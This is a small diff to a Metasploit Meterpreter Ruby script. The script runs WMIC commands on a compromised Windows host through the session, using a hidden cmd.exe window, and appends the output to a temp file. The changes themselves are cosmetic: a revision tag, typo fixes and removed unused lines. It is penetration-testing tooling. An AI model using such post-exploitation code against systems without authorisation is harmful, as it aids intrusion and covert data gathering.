@@ -1,8 +1,8 @@
 # $Id$
+# $Revision$
 #Meterpreter script for running WMIC commands on Windows 2003, Windows Vista
 # and Windows XP and Windows 2008 targets.
 #Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
-#Verion: 0.1
 ################## Variable Declarations ##################
 session = client
 wininfo = client.sys.config.sysinfo
@@ -21,9 +21,7 @@ outfile = nil
 ################## Function Declarations ##################
 # Function for running a list of WMIC commands stored in a array, returs string
 def wmicexec(session,wmiccmds= nil)
-	windr = ''
 	tmpout = ''
-	windrtmp = ""
 	session.response_timeout=120
 	begin
 		tmp = session.fs.file.expand_path("%TEMP%")
@@ -33,7 +31,7 @@ def wmicexec(session,wmiccmds= nil)
 			puts wmicfl
 			r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmi}", nil, {'Hidden' => true})
 			sleep(2)
-			#Making sure that wmic finnishes before executing next wmic command
+			#Making sure that wmic finishes before executing next wmic command
 			prog2check = "wmic.exe"
 			found = 0
 			while found == 0
@@ -41,7 +39,6 @@ def wmicexec(session,wmiccmds= nil)
 					found =1
 					if prog2check == (x['name'].downcase)
 						sleep(0.5)
-						print_line "."
 						found = 0
 					end
 				end
